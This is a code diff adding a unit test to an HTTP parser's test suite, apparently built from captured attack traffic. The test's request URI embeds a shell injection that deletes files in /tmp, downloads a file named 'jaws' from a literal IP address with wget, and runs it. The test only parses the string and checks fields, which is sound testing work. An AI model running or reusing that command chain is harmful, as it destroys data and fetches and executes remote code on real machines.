@@ -28,6 +28,27 @@ static void http_request_test(void)
 	http_parser_destroy(parser);
 }
 
+static void http_request_test2(void)
+{
+	static const char* s = "GET /shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q\r\n";
+
+	size_t n;
+	int major, minor;
+	char protocol[64];
+	http_parser_t* parser;
+
+	n = strlen(s);
+	parser = http_parser_create(HTTP_PARSER_REQUEST, NULL, NULL);
+	assert(1 /*INPUT_HEADER*/ == http_parser_input(parser, s, &n));
+	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
+	assert(0 == strcmp(http_get_request_uri(parser), "/shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws"));
+	assert(0 == strcmp(http_get_request_method(parser), "GET"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Host"), "127.0.0.1:80"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "User-Agent"), "Hello, world"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Accept"), "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q"));
+	http_parser_destroy(parser);
+}
+
 static void http_chunk_test(void)
 {
 	static const char s[] = { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4f
@@ -213,6 +234,7 @@ void http_parser_test(void)
 {
 	int i;
 	http_request_test();
+	http_request_test2();
 	http_chunk_test();
 	rtsp_response_test();
 	sip_response_test();
